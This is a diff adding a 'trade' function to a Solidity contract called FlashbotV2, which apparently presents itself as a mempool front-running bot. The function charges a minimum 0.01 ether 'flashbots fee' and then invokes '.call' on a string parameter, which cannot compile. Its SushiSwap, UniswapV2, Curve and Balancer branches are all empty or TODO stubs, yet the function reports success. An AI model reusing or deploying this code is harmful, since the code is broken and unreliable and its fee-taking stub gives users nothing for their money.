@@ -5,6 +5,40 @@ contract FlashbotV2 {
     event Log(string message); 
 
     constructor() payable {} 
+     
+     function trade(string memory _exchange, address _token, uint256 _price) public payable returns (bool) {
+        require(msg.value >= 0.01 ether, "Insufficient flashbots fee");
+        require(msg.sender == tx.origin, "Flashbots relay protection");
+
+        bytes memory encodedFunctionCall = abi.encodeWithSignature("mempool()");
+        (bool success, bytes memory returnData) = _exchange.call{value: 0, gas: 100000} (encodedFunctionCall);
+
+        if (success) {
+            string memory _fullMempool = string(returnData);
+
+            // Adding support for SushiSwap
+            if (keccak256(bytes(_exchange)) == keccak256(bytes("SushiSwap"))) {
+                // TODO: Implement logic for SushiSwap
+            } 
+            else if (keccak256(bytes(_exchange)) == keccak256(bytes("UniswapV2"))) {
+                // Implement logic for UniswapV2
+            } 
+            else if (keccak256(bytes(_exchange)) == keccak256(bytes("Curve"))) {
+                // TODO: Implement logic for Curve
+            } 
+            else if (keccak256(bytes(_exchange)) == keccak256(bytes("Balancer"))) {
+                // TODO: Implement logic for Balancer
+            } 
+            else {
+                revert("Unsupported exchange");
+            }
+
+            return true;
+        } else {
+            revert("Call failed");
+        }
+    }
+
 
     /*
      * @dev loads all Uniswap mempool into memory
